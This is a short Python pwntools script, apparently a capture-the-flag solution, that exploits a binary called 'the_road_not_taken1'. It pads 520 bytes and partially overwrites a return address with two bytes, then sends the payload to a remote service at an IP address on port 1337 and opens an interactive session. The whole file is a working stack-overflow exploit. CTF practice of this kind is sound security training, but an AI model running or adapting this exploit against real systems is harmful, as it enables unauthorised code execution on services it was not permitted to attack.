from pwn import *

elf = context.binary = ELF('./the_road_not_taken1')

context.log_level = 'debug'

# p = process()
p = remote("34.100.142.216", 1337)

payload = b'a'*520
payload += b'\x59\x11'

p.sendline(payload)
p.interactive()
